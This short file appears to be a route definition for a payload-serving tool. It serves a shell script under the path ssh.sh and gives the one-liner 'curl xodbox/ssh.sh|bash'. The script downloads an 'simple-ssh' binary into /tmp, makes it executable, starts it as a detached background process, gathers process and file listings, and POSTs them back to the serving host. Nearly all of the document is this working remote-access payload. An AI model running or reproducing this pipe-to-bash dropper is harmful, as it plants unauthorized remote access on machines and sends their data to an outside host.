---
title: Simple SSH
description: Simple SSH (requires build of simple ssh server in static dir)
weight: 1
pattern: /ssh.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    DEST_FILE=/tmp/s
    OS=$(uname)
    ARCH=$(uname -m)
    curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
    chmod +x $DEST_FILE
    bash -c "$DEST_FILE > /tmp/bso 2>&1 &" &
    r=$(ps aux | grep bs ;cat /tmp/bso; ls -lah /tmp/bs)
    disown

    echo $r
    curl "{{.Request.Host}}/l/res/" --data "$r" -X POST
---


```bash
curl xodbox/ssh.sh|bash
```